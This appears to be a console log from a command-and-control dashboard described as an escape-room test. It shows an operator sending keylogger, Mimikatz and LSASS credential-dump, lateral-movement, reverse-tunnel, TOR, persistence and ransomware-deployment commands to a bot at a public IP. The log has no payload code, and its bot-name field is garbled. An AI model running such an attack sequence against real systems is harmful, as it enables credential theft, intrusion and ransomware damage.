+| WEB DASHBOARD: http://localhost:8080/                                     |
++============================================================================+
+[2025-08-24 19:05:05] [C2             ] [COMMAND             ] Starting keylogger on all bots
+[2025-08-24 19:05:05] [C2             ] [PROCESSING_QUEUE    ] Processing 1 queued commands for 3.81.15.120:51261
+[2025-08-24 19:05:05] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_24464_8859687] Command KEYLOGGER_ACTIVATION sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: KEYLOGGER_ACTIVATION (ID: 33) to 3.81.15.120:51261
+[2025-08-24 19:05:05] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent KEYLOGGER_ACTIVATION packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 33
+[2025-08-24 19:05:05] [C2             ] [COMMAND_SENT        ] Sent KEYLOGGER_ACTIVATION to 3.81.15.120:51261
+[2025-08-24 19:05:05] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:KEYLOGGER_ACTIVATION:REQUEST_DATA
+ - Bytes: 38
+[2025-08-24 19:05:05] [C2             ] [COMMAND_SENT        ] Sent KEYLOGGER_ACTIVATION to 3.81.15.120:51261
+
+================================================================================
+
++==============================================================+
+|         C2 COMMAND & CONTROL DASHBOARD - ESCAPE ROOM         |
++==============================================================+
+| Active Bots: 1         |  Elevated: 0         |  Beacons: 2        |
+| Server Jobs: 0         |  Queued: 0           |  Workers: 6        |
+| Commands Sent: 13      |  Server Uptime: 0          min |
+| [19:05:05] SERVER STATUS: ONLINE | Recent Activity: 100 entries |
+[2025-08-24 19:05:05] [SERVER_STATUS  ] [DASHBOARD_UPDATE    ] Active: 1 | Elevated: 0 | Commands: 13
++--------------------------------------------------------------+
+|                        CONNECTED BOTS                        |
++--------------------------------------------------------------+
++---------------------- COMMAND STATUS -----------------------+
+| [2025-08-24 16:53:37] [CMD_SENT] [COMMAND_DISPATCH] [SRV_... |
+| [2025-08-24 16:53:37] [SERVER_STATUS] [DASHBOARD_UPDATE] ... |
+| [2025-08-24 16:53:42] [SERVER_STATUS] [DASHBOARD_UPDATE] ... |
+| [2025-08-24 16:53:46] [CMD_SENT] [COMMAND_DISPATCH] [SRV_... |
+| [2025-08-24 16:53:46] [CMD_RESPONSE] [RESPONSE_RECEIVED] ... |
++--------------------------------------------------------------+
+| -%*8+'='28$*U^eO]XtBF\s]QPI_f[\2hYX]vUB'2152 ;U^eO]XtBF\s]QPI_f[\2hYX]vUBU}KWSG\d | 3.81.15.120     |              | Up: 0  m | LS: 6  s |
++==============================================================+
+|                     ATTACK INDICATORS                        |
++--------------------------------------------------------------+
+| [ACTIVE] Credential Harvesting    | [ACTIVE] Lateral Movement|
+| [ACTIVE] Data Exfiltration       | [ACTIVE] Persistence      |
+| [ACTIVE] Process Injection       | [READY]  Ransomware       |
++--------------------------------------------------------------+
+|                    TEST EXECUTION STATUS                     |
++--------------------------------------------------------------+
+| -%*8+'='2 | Progress: 0 /10 phases | Status: TESTING IN PROGRESS  |
++==============================================================+
+
++----------------------- CONTROL LEGEND -----------------------+
+| MANUAL MODE ACTIVE - Press H for full help menu             |
+| [ESC] Exit  | [1-5] Attack Phases  | [R] Ransomware         |
+| [E] Exfil   | [P] Persistence      | [C] Clear All Logs         |
+| [S] Screenshot | [K] Keylogger     | [D] Dump Keylogs       |
+| [N] Network Tunnels | [T] TOR | [F12] Remote Desktop       |
++--------------------------------------------------------------+
+
++----------------------- RECENT ACTIVITY ----------------------+
+| COMMAND STATUS: 13 commands sent recently | Total Session: 13 commands |
+| FILE LOGGING: C:\temp\c2_server_status.txt (persistent)                 |
+| [SERVER_STATUS] DASHBOARD_UPDATE: Active: 1 | Elevated: 0... |
+| [C2] COMMAND_SENT: Sent KEYLOGGER_ACTIVATION to 3.81.15.1... |
+| [DEBUG] TEXT_COMMAND_SENT: Sent text command to 3.81.15.1... |
+| [C2] COMMAND_SENT: Sent KEYLOGGER_ACTIVATION to 3.81.15.1... |
+| [DEBUG] COMMAND_PACKET_SENT: Sent KEYLOGGER_ACTIVATION pa... |
+| [CMD_SENT] COMMAND_DISPATCH: [SRV_CMD_24464_8859687] Comm... |
+|                                                              |
+|                                                              |
++--------------------------------------------------------------+
+
+[2025-08-24 19:05:05] Server running. Total commands sent: 13
+[2025-08-24 19:05:05] [C2             ] [COMMAND             ] Starting lateral movement on all bots
+[2025-08-24 19:05:06] [C2             ] [COMMAND             ] Executing Mimikatz on all bots
+[2025-08-24 19:05:06] [C2             ] [PROCESSING_QUEUE    ] Processing 5 queued commands for 3.81.15.120:51261
+[2025-08-24 19:05:06] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_5705_8860437] Command NETWORK_PORT_SCANNING sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: NETWORK_PORT_SCANNING (ID: 80) to 3.81.15.120:51261
+[2025-08-24 19:05:06] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent NETWORK_PORT_SCANNING packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 80
+[2025-08-24 19:05:06] [C2             ] [COMMAND_SENT        ] Sent NETWORK_PORT_SCANNING to 3.81.15.120:51261
+[2025-08-24 19:05:06] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:NETWORK_PORT_SCANNING:REQUEST_DATA
+ - Bytes: 39
+[2025-08-24 19:05:06] [C2             ] [COMMAND_SENT        ] Sent NETWORK_PORT_SCANNING to 3.81.15.120:51261
+[2025-08-24 19:05:06] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_28145_8860453] Command SMB_SHARE_ENUMERATION sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: SMB_SHARE_ENUMERATION (ID: 81) to 3.81.15.120:51261
+[2025-08-24 19:05:06] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent SMB_SHARE_ENUMERATION packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 81
+[2025-08-24 19:05:06] [C2             ] [COMMAND_SENT        ] Sent SMB_SHARE_ENUMERATION to 3.81.15.120:51261
+[2025-08-24 19:05:06] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:SMB_SHARE_ENUMERATION:REQUEST_DATA
+ - Bytes: 39
+[2025-08-24 19:05:06] [C2             ] [COMMAND_SENT        ] Sent SMB_SHARE_ENUMERATION to 3.81.15.120:51261
+[2025-08-24 19:05:06] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_23281_8860453] Command PSEXEC_LATERAL_MOVEMENT sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: PSEXEC_LATERAL_MOVEMENT (ID: 82) to 3.81.15.120:51261
+[2025-08-24 19:05:06] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent PSEXEC_LATERAL_MOVEMENT packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 82
+[2025-08-24 19:05:06] [C2             ] [COMMAND_SENT        ] Sent PSEXEC_LATERAL_MOVEMENT to 3.81.15.120:51261
+[2025-08-24 19:05:06] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:PSEXEC_LATERAL_MOVEMENT:REQUEST_DATA
+ - Bytes: 41
+[2025-08-24 19:05:06] [C2             ] [COMMAND_SENT        ] Sent PSEXEC_LATERAL_MOVEMENT to 3.81.15.120:51261
+[2025-08-24 19:05:06] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_16827_8860468] Command MIMIKATZ_CREDENTIAL_DUMP sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: MIMIKATZ_CREDENTIAL_DUMP (ID: 86) to 3.81.15.120:51261
+[2025-08-24 19:05:06] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent MIMIKATZ_CREDENTIAL_DUMP packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 86
+[2025-08-24 19:05:06] [C2             ] [COMMAND_SENT        ] Sent MIMIKATZ_CREDENTIAL_DUMP to 3.81.15.120:51261
+[2025-08-24 19:05:06] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:MIMIKATZ_CREDENTIAL_DUMP:REQUEST_DATA
+ - Bytes: 42
+[2025-08-24 19:05:06] [C2             ] [COMMAND_SENT        ] Sent MIMIKATZ_CREDENTIAL_DUMP to 3.81.15.120:51261
+[2025-08-24 19:05:06] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_9961_8860468] Command LSASS_MEMORY_DUMP sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: LSASS_MEMORY_DUMP (ID: 99) to 3.81.15.120:51261
+[2025-08-24 19:05:06] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent LSASS_MEMORY_DUMP packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 99
+[2025-08-24 19:05:06] [C2             ] [COMMAND_SENT        ] Sent LSASS_MEMORY_DUMP to 3.81.15.120:51261
+[2025-08-24 19:05:06] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:LSASS_MEMORY_DUMP:REQUEST_DATA
+ - Bytes: 35
+[2025-08-24 19:05:06] [C2             ] [COMMAND_SENT        ] Sent LSASS_MEMORY_DUMP to 3.81.15.120:51261
+
+[!] MANUAL COMMAND TRIGGERED: N - Network Tunnels (SSH/Netcat/Socat/Cryptcat)
+[WARNING] This will create REAL network processes and connections!
+[2025-08-24 19:05:06] [*** MANUAL *** ] [N_PRESSED           ] Network tunnels initiated by operator
+[2025-08-24 19:05:06] [C2             ] [COMMAND             ] Creating network tunnels (SSH/Netcat/Socat/Cryptcat) on all bots
+[+] 4 network commands queued for 1 active client(s)
+[2025-08-24 19:05:06] [C2             ] [PROCESSING_QUEUE    ] Processing 4 queued commands for 3.81.15.120:51261
+[2025-08-24 19:05:06] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_491_8861015] Command REVERSE_SSH_TUNNEL sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: REVERSE_SSH_TUNNEL (ID: 162) to 3.81.15.120:51261
+[2025-08-24 19:05:06] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent REVERSE_SSH_TUNNEL packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 162
+[2025-08-24 19:05:06] [C2             ] [COMMAND_SENT        ] Sent REVERSE_SSH_TUNNEL to 3.81.15.120:51261
+[2025-08-24 19:05:06] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:REVERSE_SSH_TUNNEL:REQUEST_DATA
+ - Bytes: 36
+[2025-08-24 19:05:06] [C2             ] [COMMAND_SENT        ] Sent REVERSE_SSH_TUNNEL to 3.81.15.120:51261
+[2025-08-24 19:05:06] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_2995_8861031] Command NETCAT_NETWORK_TUNNEL sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: NETCAT_NETWORK_TUNNEL (ID: 163) to 3.81.15.120:51261
+[2025-08-24 19:05:06] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent NETCAT_NETWORK_TUNNEL packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 163
+[2025-08-24 19:05:06] [C2             ] [COMMAND_SENT        ] Sent NETCAT_NETWORK_TUNNEL to 3.81.15.120:51261
+[2025-08-24 19:05:06] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:NETCAT_NETWORK_TUNNEL:REQUEST_DATA
+ - Bytes: 39
+[2025-08-24 19:05:06] [C2             ] [COMMAND_SENT        ] Sent NETCAT_NETWORK_TUNNEL to 3.81.15.120:51261
+[2025-08-24 19:05:06] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_11942_8861031] Command SOCAT_NETWORK_RELAY sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: SOCAT_NETWORK_RELAY (ID: 164) to 3.81.15.120:51261
+[2025-08-24 19:05:06] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent SOCAT_NETWORK_RELAY packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 164
+[2025-08-24 19:05:06] [C2             ] [COMMAND_SENT        ] Sent SOCAT_NETWORK_RELAY to 3.81.15.120:51261
+[2025-08-24 19:05:06] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:SOCAT_NETWORK_RELAY:REQUEST_DATA
+ - Bytes: 37
+[2025-08-24 19:05:06] [C2             ] [COMMAND_SENT        ] Sent SOCAT_NETWORK_RELAY to 3.81.15.120:51261
+[2025-08-24 19:05:06] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_4827_8861031] Command CRYPTCAT_ENCRYPTED_TUNNEL sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: CRYPTCAT_ENCRYPTED_TUNNEL (ID: 165) to 3.81.15.120:51261
+[2025-08-24 19:05:07] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent CRYPTCAT_ENCRYPTED_TUNNEL packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 165
+[2025-08-24 19:05:07] [C2             ] [COMMAND_SENT        ] Sent CRYPTCAT_ENCRYPTED_TUNNEL to 3.81.15.120:51261
+[2025-08-24 19:05:07] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:CRYPTCAT_ENCRYPTED_TUNNEL:REQUEST_DATA
+ - Bytes: 43
+[2025-08-24 19:05:07] [C2             ] [COMMAND_SENT        ] Sent CRYPTCAT_ENCRYPTED_TUNNEL to 3.81.15.120:51261
+
+[!] MANUAL COMMAND TRIGGERED: O - TOR Netcat/Socat/Cryptcat
+[WARNING] This will create REAL network processes and connections!
+[2025-08-24 19:05:07] [*** MANUAL *** ] [O_PRESSED           ] TOR netcat/socat/cryptcat initiated by operator
+[2025-08-24 19:05:07] [C2             ] [COMMAND             ] Creating TOR netcat/socat/cryptcat connections on all bots
+[+] 3 network commands queued for 1 active client(s)
+[2025-08-24 19:05:07] [C2             ] [PROCESSING_QUEUE    ] Processing 3 queued commands for 3.81.15.120:51261
+[2025-08-24 19:05:07] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_5436_8861562] Command NETCAT_NETWORK_TUNNEL sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: NETCAT_NETWORK_TUNNEL (ID: 163) to 3.81.15.120:51261
+[2025-08-24 19:05:07] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent NETCAT_NETWORK_TUNNEL packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 163
+[2025-08-24 19:05:07] [C2             ] [COMMAND_SENT        ] Sent NETCAT_NETWORK_TUNNEL to 3.81.15.120:51261
+[2025-08-24 19:05:07] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:NETCAT_NETWORK_TUNNEL:REQUEST_DATA
+ - Bytes: 39
+[2025-08-24 19:05:07] [C2             ] [COMMAND_SENT        ] Sent NETCAT_NETWORK_TUNNEL to 3.81.15.120:51261
+[2025-08-24 19:05:07] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_32391_8861578] Command SOCAT_NETWORK_RELAY sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: SOCAT_NETWORK_RELAY (ID: 164) to 3.81.15.120:51261
+[2025-08-24 19:05:07] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent SOCAT_NETWORK_RELAY packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 164
+[2025-08-24 19:05:07] [C2             ] [COMMAND_SENT        ] Sent SOCAT_NETWORK_RELAY to 3.81.15.120:51261
+[2025-08-24 19:05:07] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:SOCAT_NETWORK_RELAY:REQUEST_DATA
+ - Bytes: 37
+[2025-08-24 19:05:07] [C2             ] [COMMAND_SENT        ] Sent SOCAT_NETWORK_RELAY to 3.81.15.120:51261
+[2025-08-24 19:05:07] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_14604_8861578] Command CRYPTCAT_ENCRYPTED_TUNNEL sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: CRYPTCAT_ENCRYPTED_TUNNEL (ID: 165) to 3.81.15.120:51261
+[2025-08-24 19:05:07] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent CRYPTCAT_ENCRYPTED_TUNNEL packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 165
+[2025-08-24 19:05:07] [C2             ] [COMMAND_SENT        ] Sent CRYPTCAT_ENCRYPTED_TUNNEL to 3.81.15.120:51261
+[2025-08-24 19:05:07] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:CRYPTCAT_ENCRYPTED_TUNNEL:REQUEST_DATA
+ - Bytes: 43
+[2025-08-24 19:05:07] [C2             ] [COMMAND_SENT        ] Sent CRYPTCAT_ENCRYPTED_TUNNEL to 3.81.15.120:51261
+[2025-08-24 19:05:07] [C2             ] [COMMAND             ] Installing persistence mechanisms on all bots
+[2025-08-24 19:05:08] [C2             ] [PROCESSING_QUEUE    ] Processing 3 queued commands for 3.81.15.120:51261
+[2025-08-24 19:05:08] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_3902_8862109] Command MALICIOUS_SERVICE_INSTALLATION sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: MALICIOUS_SERVICE_INSTALLATION (ID: 64) to 3.81.15.120:51261
+[2025-08-24 19:05:08] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent MALICIOUS_SERVICE_INSTALLATION packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 64
+[2025-08-24 19:05:08] [C2             ] [COMMAND_SENT        ] Sent MALICIOUS_SERVICE_INSTALLATION to 3.81.15.120:51261
+[2025-08-24 19:05:08] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:MALICIOUS_SERVICE_INSTALLATION:REQUEST_DATA
+ - Bytes: 48
+[2025-08-24 19:05:08] [C2             ] [COMMAND_SENT        ] Sent MALICIOUS_SERVICE_INSTALLATION to 3.81.15.120:51261
+[2025-08-24 19:05:08] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_153_8862109] Command REGISTRY_PERSISTENCE_MECHANISM sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: REGISTRY_PERSISTENCE_MECHANISM (ID: 65) to 3.81.15.120:51261
+[2025-08-24 19:05:08] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent REGISTRY_PERSISTENCE_MECHANISM packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 65
+[2025-08-24 19:05:08] [C2             ] [COMMAND_SENT        ] Sent REGISTRY_PERSISTENCE_MECHANISM to 3.81.15.120:51261
+[2025-08-24 19:05:08] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:REGISTRY_PERSISTENCE_MECHANISM:REQUEST_DATA
+ - Bytes: 48
+[2025-08-24 19:05:08] [C2             ] [COMMAND_SENT        ] Sent REGISTRY_PERSISTENCE_MECHANISM to 3.81.15.120:51261
+[2025-08-24 19:05:08] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_292_8862125] Command SCHEDULED_TASK_PERSISTENCE sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: SCHEDULED_TASK_PERSISTENCE (ID: 66) to 3.81.15.120:51261
+[2025-08-24 19:05:08] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent SCHEDULED_TASK_PERSISTENCE packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 66
+[2025-08-24 19:05:08] [C2             ] [COMMAND_SENT        ] Sent SCHEDULED_TASK_PERSISTENCE to 3.81.15.120:51261
+[2025-08-24 19:05:08] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:SCHEDULED_TASK_PERSISTENCE:REQUEST_DATA
+ - Bytes: 44
+[2025-08-24 19:05:08] [C2             ] [COMMAND_SENT        ] Sent SCHEDULED_TASK_PERSISTENCE to 3.81.15.120:51261
+[2025-08-24 19:05:09] [C2             ] [COMMAND             ] Triggering ransomware simulation on all bots
+[2025-08-24 19:05:09] [C2             ] [PROCESSING_QUEUE    ] Processing 1 queued commands for 3.81.15.120:51261
+[2025-08-24 19:05:09] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_12382_8863781] Command RANSOMWARE_DEPLOYMENT sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: RANSOMWARE_DEPLOYMENT (ID: 144) to 3.81.15.120:51261
+[2025-08-24 19:05:09] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent RANSOMWARE_DEPLOYMENT packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 144
+[2025-08-24 19:05:09] [C2             ] [COMMAND_SENT        ] Sent RANSOMWARE_DEPLOYMENT to 3.81.15.120:51261
+[2025-08-24 19:05:09] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:RANSOMWARE_DEPLOYMENT:REQUEST_DATA
+ - Bytes: 39
+[2025-08-24 19:05:09] [C2             ] [COMMAND_SENT        ] Sent RANSOMWARE_DEPLOYMENT to 3.81.15.120:51261
+
+[!] MANUAL COMMAND TRIGGERED: S - Screenshot Capture
+[2025-08-24 19:05:10] [*** MANUAL *** ] [S_PRESSED           ] Screenshot capture initiated by operator
+[2025-08-24 19:05:10] [C2             ] [COMMAND             ] Taking screenshots from all bots
+[+] Command queued for 1 active client(s)
+[2025-08-24 19:05:10] [C2             ] [COMMAND             ] Establishing TOR connections on all bots
+
+================================================================================
+
++==============================================================+
+|         C2 COMMAND & CONTROL DASHBOARD - ESCAPE ROOM         |
++==============================================================+
+| Active Bots: 1         |  Elevated: 0         |  Beacons: 2        |
+| Server Jobs: 0         |  Queued: 0           |  Workers: 6        |
+| Commands Sent: 29      |  Server Uptime: 0          min |
+| [19:05:10] SERVER STATUS: ONLINE | Recent Activity: 100 entries |
+[2025-08-24 19:05:10] [SERVER_STATUS  ] [DASHBOARD_UPDATE    ] Active: 1 | Elevated: 0 | Commands: 29
++--------------------------------------------------------------+
+|                        CONNECTED BOTS                        |
++--------------------------------------------------------------+
++---------------------- COMMAND STATUS -----------------------+
+| [2025-08-24 16:53:37] [CMD_SENT] [COMMAND_DISPATCH] [SRV_... |
+| [2025-08-24 16:53:37] [SERVER_STATUS] [DASHBOARD_UPDATE] ... |
+| [2025-08-24 16:53:42] [SERVER_STATUS] [DASHBOARD_UPDATE] ... |
+| [2025-08-24 16:53:46] [CMD_SENT] [COMMAND_DISPATCH] [SRV_... |
+| [2025-08-24 16:53:46] [CMD_RESPONSE] [RESPONSE_RECEIVED] ... |
++--------------------------------------------------------------+
+| -%*8+'='28$*U^eO]XtBF\s]QPI_f[\2hYX]vUB'2152 ;U^eO]XtBF\s]QPI_f[\2hYX]vUBU}KWSG\d | 3.81.15.120     |              | Up: 0  m | LS: 11 s |
++==============================================================+
+|                     ATTACK INDICATORS                        |
++--------------------------------------------------------------+
+| [ACTIVE] Credential Harvesting    | [ACTIVE] Lateral Movement|
+| [ACTIVE] Data Exfiltration       | [ACTIVE] Persistence      |
+| [ACTIVE] Process Injection       | [READY]  Ransomware       |
++--------------------------------------------------------------+
+|                    TEST EXECUTION STATUS                     |
++--------------------------------------------------------------+
+| -%*8+'='2 | Progress: 0 /10 phases | Status: TESTING IN PROGRESS  |
++==============================================================+
+
++----------------------- CONTROL LEGEND -----------------------+
+| MANUAL MODE ACTIVE - Press H for full help menu             |
+| [ESC] Exit  | [1-5] Attack Phases  | [R] Ransomware         |
+| [E] Exfil   | [P] Persistence      | [C] Clear All Logs         |
+| [S] Screenshot | [K] Keylogger     | [D] Dump Keylogs       |
+| [N] Network Tunnels | [T] TOR | [F12] Remote Desktop       |
++--------------------------------------------------------------+
+
++----------------------- RECENT ACTIVITY ----------------------+
+| COMMAND STATUS: 16 commands sent recently | Total Session: 29 commands |
+| FILE LOGGING: C:\temp\c2_server_status.txt (persistent)                 |
+| [SERVER_STATUS] DASHBOARD_UPDATE: Active: 1 | Elevated: 0... |
+| [C2] COMMAND: Establishing TOR connections on all bots       |
+| [C2] COMMAND: Taking screenshots from all bots               |
+| [*** MANUAL ***] S_PRESSED: Screenshot capture initiated ... |
+| [C2] COMMAND_SENT: Sent RANSOMWARE_DEPLOYMENT to 3.81.15.... |
+| [DEBUG] TEXT_COMMAND_SENT: Sent text command to 3.81.15.1... |
+|                                                              |
+|                                                              |
++--------------------------------------------------------------+
+
+[2025-08-24 19:05:10] Server running. Total commands sent: 29
+[2025-08-24 19:05:10] [C2             ] [PROCESSING_QUEUE    ] Processing 3 queued commands for 3.81.15.120:51261
+[2025-08-24 19:05:10] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_17421_8864921] Command SCREENSHOT_CAPTURE sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: SCREENSHOT_CAPTURE (ID: 32) to 3.81.15.120:51261
+[2025-08-24 19:05:10] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent SCREENSHOT_CAPTURE packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 32
+[2025-08-24 19:05:10] [C2             ] [COMMAND_SENT        ] Sent SCREENSHOT_CAPTURE to 3.81.15.120:51261
+[2025-08-24 19:05:10] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:SCREENSHOT_CAPTURE:REQUEST_DATA
+ - Bytes: 36
+[2025-08-24 19:05:10] [C2             ] [COMMAND_SENT        ] Sent SCREENSHOT_CAPTURE to 3.81.15.120:51261
+[2025-08-24 19:05:10] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_18716_8864937] Command TOR_NETWORK_CONNECTION sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: TOR_NETWORK_CONNECTION (ID: 160) to 3.81.15.120:51261
+[2025-08-24 19:05:10] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent TOR_NETWORK_CONNECTION packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 160
+[2025-08-24 19:05:10] [C2             ] [COMMAND_SENT        ] Sent TOR_NETWORK_CONNECTION to 3.81.15.120:51261
+[2025-08-24 19:05:10] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:TOR_NETWORK_CONNECTION:REQUEST_DATA
+ - Bytes: 40
+[2025-08-24 19:05:10] [C2             ] [COMMAND_SENT        ] Sent TOR_NETWORK_CONNECTION to 3.81.15.120:51261
+[2025-08-24 19:05:10] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_19718_8864937] Command TOR_API_COMMUNICATION sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: TOR_API_COMMUNICATION (ID: 161) to 3.81.15.120:51261
+[2025-08-24 19:05:10] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent TOR_API_COMMUNICATION packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 161
+[2025-08-24 19:05:10] [C2             ] [COMMAND_SENT        ] Sent TOR_API_COMMUNICATION to 3.81.15.120:51261
+[2025-08-24 19:05:10] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:TOR_API_COMMUNICATION:REQUEST_DATA
+ - Bytes: 39
+[2025-08-24 19:05:10] [C2             ] [COMMAND_SENT        ] Sent TOR_API_COMMUNICATION to 3.81.15.120:51261
+[2025-08-24 19:05:11] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_2306_8865140] Command HEARTBEAT_BEACON sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: HEARTBEAT_BEACON (ID: 1) to 3.81.15.120:51261
+[2025-08-24 19:05:11] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent HEARTBEAT_BEACON packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 1
+[2025-08-24 19:05:11] [C2             ] [COMMAND_SENT        ] Sent HEARTBEAT_BEACON to 3.81.15.120:51261
+[2025-08-24 19:05:11] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:HEARTBEAT_BEACON:REQUEST_DATA
+ - Bytes: 34
+[2025-08-24 19:05:11] [DEBUG          ] [DATA_CHUNK_RECEIVED ] From 3.81.15.120:51261 - Chunk size: 88 - Total so far: 88
+[2025-08-24 19:05:11] [DEBUG          ] [RAW_DATA_RECEIVED   ] From 3.81.15.120:51261 - Total bytes: 88 - First 50 chars: HEARTBEAT:35.175.236.219:443_8842796:8857843HEARTB
+[2025-08-24 19:05:11] [DEBUG          ] [DECRYPTED_DATA      ] From 3.81.15.120:51261 - Length: 88 - Preview: HEARTBEAT:35.175.236.219:443_8842796:8857843HEARTBEAT:35.175.236.219:443_8842796:8862859
